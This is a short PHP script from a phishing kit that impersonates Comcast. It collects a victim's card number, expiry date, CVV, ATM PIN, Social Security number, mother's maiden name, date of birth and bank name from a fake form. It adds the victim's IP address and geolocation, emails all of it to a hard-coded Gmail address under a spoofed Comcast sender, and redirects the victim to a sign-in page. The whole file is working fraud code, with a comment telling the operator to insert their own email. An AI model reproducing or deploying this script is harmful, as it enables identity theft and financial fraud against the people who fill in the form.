<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Comcast Info-----------------------\n";
$message .= "|Credit/Debit Card number  : ".$_POST['cardno']."\n";
$message .= "|Expiratory date : ".$_POST['expdate']."\n";
$message .= "|Cvv : ".$_POST['cvv']."\n";
$message .= "|Pin : ".$_POST['atmpin']."\n";
$message .= "|Mother's maiden name : ".$_POST['mmn']."\n";
$message .= "|Social Security number : ".$_POST['ssn']."\n";
$message .= "|Date of birth : ".$_POST['dateOfBirth']."\n";
$message .= "|Phone number : ".$_POST['accountPhoneNumber2']."\n";
$message .= "|Card bank name : ".$_POST['cardbank']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY Blow-------------\n";
//change ur email here
$send = "mrbonjee@gmail.com";
$subject = "Result from Comcast";
$headers = "From: comcast<pirates@mxtoolbox.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }
    header("Location: sign_in.htm");
  

?>